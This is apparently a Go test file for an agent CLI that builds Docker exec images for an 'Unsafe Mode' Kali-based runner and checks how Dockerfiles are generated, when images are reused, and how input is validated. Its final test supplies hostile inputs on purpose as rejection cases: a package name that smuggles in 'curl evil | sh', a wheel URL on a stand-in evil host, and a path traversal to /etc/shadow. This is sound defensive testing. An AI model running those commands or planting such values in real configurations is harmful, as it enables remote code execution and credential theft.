package gateway

import (
	"io"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"

	"github.com/blaktron/agentry-cli/pkg/runner/dockerx"
	"github.com/blaktron/agentry-cli/pkg/runner/spec"
)

const unsafeBase = "ghcr.io/blaktron/agentry-unsafe-kali:2026.09.30.2@sha256:87fa4ae406a9621cef3a4cffcdccf2a512da03141ca21727ce663ca715a191da"

func unsafeImage() spec.ExecImageSpec {
	u := spec.UnsafeExecSpec{
		Base: unsafeBase,
		Extras: []spec.UnsafeExtra{
			{Command: "analyzeHeadless", Kind: "link", Package: "ghidra", Path: "usr/share/ghidra/support/analyzeHeadless"},
			{Command: "decompyle3", Kind: "pip", Spec: "decompyle3==3.9.3"},
		},
		Unplaced: []spec.UnplacedCommand{{Command: "nothere"}},
	}
	cmds := []string{"analyzeHeadless", "decompyle3", "git", "nothere", "strings"}
	pkgs := []string{"binutils", "ghidra", "git"}
	return spec.ExecImageSpec{Tag: spec.UnsafeExecImageTag("agentry-runner:v1", u, cmds, pkgs), Commands: cmds, Packages: pkgs, Unsafe: &u}
}

// buildDir returns the context directory of the one build of tag.
func buildDir(t *testing.T, fake *dockerx.Fake, tag string) string {
	t.Helper()
	var dirs []string
	for _, op := range fake.Ops() {
		if strings.HasPrefix(op, "Build:"+tag+"<-") {
			dirs = append(dirs, strings.TrimPrefix(op, "Build:"+tag+"<-"))
		}
	}
	if len(dirs) != 1 {
		t.Fatalf("%d builds of %s: %v", len(dirs), tag, fake.Ops())
	}
	return dirs[0]
}

func read(t *testing.T, path string) string {
	t.Helper()
	b, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	return string(b)
}

// An Unsafe Mode exec image is built FROM the unsafe base with the runner
// binary copied in and as the entrypoint, one exec-form RUN of the static
// install script, and no minimize (D4). No package name, pip requirement
// or path is written into the Dockerfile or a shell line: the script
// reads them from the context's files (plan unsafe-mode.md invariant 3).
// What did not install comes back marked, after what did.
func TestEnsureUnsafeExecImageBuildsFromTheBaseWithTheValuesInFiles(t *testing.T) {
	img := unsafeImage()
	fake := &dockerx.Fake{ExistingImages: map[string]bool{}, ImageFiles: map[string]string{
		img.Tag + ":" + ExecPackagesFile: "binutils=2.45-7\ngit=1:2.51.0-1\npip decompyle3==3.9.3 sha256:ab12\n",
		img.Tag + ":" + ExecFailedFile:   "ghidra\tE: Unable to locate package ghidra\nanalyzeHeadless\t/usr/share/ghidra/support/analyzeHeadless is not in the image\n",
	}}
	got, err := EnsureExecImage(t.Context(), fake, "agentry-runner:v1", img, t.TempDir(), io.Discard)
	if err != nil {
		t.Fatal(err)
	}
	want := []string{
		"binutils=2.45-7", "git=1:2.51.0-1", "pip decompyle3==3.9.3 sha256:ab12",
		spec.ExecNotInstalledPrefix + "analyzeHeadless (/usr/share/ghidra/support/analyzeHeadless is not in the image)",
		spec.ExecNotInstalledPrefix + "ghidra (E: Unable to locate package ghidra)",
	}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("result:\n%q\nwant\n%q", got, want)
	}
	dir := buildDir(t, fake, img.Tag)
	df := read(t, filepath.Join(dir, "Dockerfile"))
	for _, must := range []string{
		"FROM " + unsafeBase + "\n",
		"COPY --from=agentry-runner:v1 /usr/local/bin/agentry-runner /usr/local/bin/agentry-runner\n",
		"RUN [\"/bin/sh\", \"/agentry-build/install.sh\"]\n",
		"ENTRYPOINT [\"/usr/local/bin/agentry-runner\"]\n",
	} {
		if !strings.Contains(df, must) {
			t.Errorf("Dockerfile lacks %q:\n%s", must, df)
		}
	}
	for _, never := range []string{`"minimize"`, "binutils", "ghidra", "decompyle3", "analyzeHeadless", "apt-get"} {
		if strings.Contains(df, never) {
			t.Errorf("Dockerfile carries %q:\n%s", never, df)
		}
	}
	if got := read(t, filepath.Join(dir, "packages.txt")); got != "binutils\nghidra\ngit\n" {
		t.Errorf("packages.txt = %q", got)
	}
	if got := read(t, filepath.Join(dir, "pip.txt")); got != "decompyle3\tdecompyle3==3.9.3\n" {
		t.Errorf("pip.txt = %q", got)
	}
	if got := read(t, filepath.Join(dir, "links.txt")); got != "analyzeHeadless\tghidra\tusr/share/ghidra/support/analyzeHeadless\n" {
		t.Errorf("links.txt = %q", got)
	}
	if _, err := os.Stat(filepath.Join(dir, "git")); err != nil {
		t.Errorf("git is declared and the context has no git marker: %v", err)
	}
	if read(t, filepath.Join(dir, "install.sh")) != string(unsafeInstallScript) {
		t.Error("the install script is not the embedded one")
	}
}

// An image whose failure record is empty is reused; one whose last build
// left tools uninstalled is rebuilt, with a new attempt value that busts
// the build cache from the install step on (§4.3).
func TestUnsafeExecImageIsRebuiltOnlyWhenItsLastBuildFailedSomething(t *testing.T) {
	img := unsafeImage()
	clean := &dockerx.Fake{ExistingImages: map[string]bool{img.Tag: true}, ImageFiles: map[string]string{
		img.Tag + ":" + ExecPackagesFile: "binutils=2.45-7\n",
		img.Tag + ":" + ExecFailedFile:   "",
	}}
	if _, err := EnsureExecImage(t.Context(), clean, "agentry-runner:v1", img, t.TempDir(), io.Discard); err != nil {
		t.Fatal(err)
	}
	for _, op := range clean.Ops() {
		if strings.HasPrefix(op, "Build:") {
			t.Fatalf("a clean image was rebuilt: %v", clean.Ops())
		}
	}

	failed := &dockerx.Fake{ExistingImages: map[string]bool{img.Tag: true}, ImageFiles: map[string]string{
		img.Tag + ":" + ExecPackagesFile: "binutils=2.45-7\n",
		img.Tag + ":" + ExecFailedFile:   "ghidra\tE: a mirror fault\n",
	}}
	if _, err := EnsureExecImage(t.Context(), failed, "agentry-runner:v1", img, t.TempDir(), io.Discard); err != nil {
		t.Fatal(err)
	}
	buildDir(t, failed, img.Tag)
	if failed.BuildArgs[img.Tag]["AGENTRY_ATTEMPT"] == "" {
		t.Fatalf("the rebuild did not bust the cache: args %v", failed.BuildArgs[img.Tag])
	}
}

// A plan file is data: an Unsafe Mode exec image whose values fail the
// grammar (a hand-edited plan, a package that is a shell line) is refused
// before anything is written or built (invariant 3).
func TestUnsafeExecImageRefusesValuesOutsideTheGrammar(t *testing.T) {
	for name, edit := range map[string]func(*spec.ExecImageSpec){
		"a package that is a shell line": func(i *spec.ExecImageSpec) { i.Packages = []string{"x; curl evil | sh"} },
		"a pip requirement with a URL":   func(i *spec.ExecImageSpec) { i.Unsafe.Extras[1].Spec = "https://evil.example/x.whl" },
		"a link path climbing out":       func(i *spec.ExecImageSpec) { i.Unsafe.Extras[0].Path = "../../etc/shadow" },
		"a base without a digest":        func(i *spec.ExecImageSpec) { i.Unsafe.Base = "kalilinux/kali-rolling:latest" },
		"a command with a newline":       func(i *spec.ExecImageSpec) { i.Commands = append(i.Commands, "x\ny") },
	} {
		img := unsafeImage()
		u := *img.Unsafe
		u.Extras = append([]spec.UnsafeExtra(nil), u.Extras...)
		img.Unsafe = &u
		edit(&img)
		fake := &dockerx.Fake{ExistingImages: map[string]bool{}, ImageFiles: map[string]string{}}
		if _, err := EnsureExecImage(t.Context(), fake, "agentry-runner:v1", img, t.TempDir(), io.Discard); err == nil {
			t.Errorf("%s was built", name)
		}
		for _, op := range fake.Ops() {
			if strings.HasPrefix(op, "Build:") {
				t.Errorf("%s reached a build", name)
			}
		}
	}
}
